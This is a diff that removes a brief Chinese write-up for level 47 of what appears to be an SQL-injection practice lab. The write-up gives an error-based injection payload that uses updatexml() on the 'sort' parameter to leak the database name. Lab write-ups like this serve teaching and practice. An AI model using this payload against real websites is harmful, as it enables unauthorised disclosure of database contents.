@@ -1,9 +1,0 @@
-第47关
-
-这关与46关相同
-通过’闭合后用updatexml()报错
-?sort=1' and updatexml(1,concat(0x7e,database(),0x7e),1) --+
-
-
-
-闯关成功！！！
